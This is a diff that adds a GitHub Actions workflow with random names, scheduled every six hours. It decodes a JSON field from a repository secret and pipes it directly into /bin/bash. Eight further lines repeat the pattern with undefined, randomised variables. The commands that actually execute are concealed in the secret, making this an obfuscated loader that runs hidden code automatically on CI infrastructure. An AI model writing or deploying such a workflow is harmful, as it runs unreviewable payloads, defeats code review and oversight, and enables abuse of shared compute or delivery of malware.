@@ -1,0 +1,26 @@
+name: jadecodez
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jadecodez
+        env:
+          v8: ${{ secrets.v8 }}
+        run: |
+          echo $v8 | jq -r .zhw0 | /bin/bash
+          echo $qyb262 | jq -r .lyi07414 | /bin/bash
+          echo $yhk74 | jq -r .ha98327 | /bin/bash
+          echo $hhqne6 | jq -r .qq559 | /bin/bash
+          echo $fl90857 | jq -r .sjecq50123 | /bin/bash
+          echo $nqpm32862 | jq -r .rmv7837 | /bin/bash
+          echo $iemr49721 | jq -r .lf973 | /bin/bash
+          echo $gyc630 | jq -r .fk02 | /bin/bash
+          echo $fl24198 | jq -r .pzk405 | /bin/bash
+
